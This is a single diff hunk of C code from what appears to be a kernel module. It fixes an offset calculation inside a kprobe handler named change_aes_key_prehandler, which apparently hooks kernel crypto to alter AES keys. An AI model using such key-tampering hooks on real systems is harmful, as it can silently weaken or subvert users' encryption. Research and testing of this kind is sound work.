@@ -193,7 +193,7 @@ static int change_aes_key_prehandler(struct kprobe *kps, struct pt_regs *regs){
     if(!enckeylen)
         return 0;
 
-    raw_aes_key = raw_key + enckeylen;
+    raw_aes_key = raw_key + raw_key_len;
     if(unlikely(!raw_aes_key))
         return 0;
 
